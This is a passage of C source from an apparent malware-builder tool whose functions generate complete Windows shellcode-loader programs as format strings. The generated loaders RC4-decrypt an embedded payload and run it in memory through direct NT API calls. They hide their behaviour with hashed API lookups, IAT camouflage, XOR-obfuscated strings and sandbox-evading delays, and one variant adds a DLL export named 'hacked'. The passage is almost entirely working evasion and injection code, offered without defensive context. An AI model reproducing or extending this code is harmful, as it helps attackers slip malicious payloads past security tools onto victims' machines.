        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE ,PVOID* ,ULONG_PTR ,PSIZE_T ,ULONG ,ULONG );\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "} \n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID process_injection() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(EncryptedPayload);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtAllocateVirtualMemory pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtAllocateVirtualMemory((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, EncryptedPayload, sPayloadSize);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, pAddress, sizeof(ProtectedKey), sPayloadSize);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll,NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    delayEx(0.5);\n"
        "    process_injection();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE ,PVOID* ,ULONG_PTR ,PSIZE_T ,ULONG ,ULONG );\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID process_injection() {\n"
        "    HANDLE        hThread = NULL;\n"
        "    PVOID         pAddress = NULL;\n"
        "    DWORD         old = 0;\n"
        "    SIZE_T        sPayloadSize = sizeof(EncryptedPayload);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtAllocateVirtualMemory pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtAllocateVirtualMemory((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, EncryptedPayload, sPayloadSize);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, pAddress, sizeof(ProtectedKey), sPayloadSize);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll, NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    delayEx(0.5);\n"
        "    process_injection();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "    return 0;\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* obfuscated_user32 = obf("user32.dll", xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
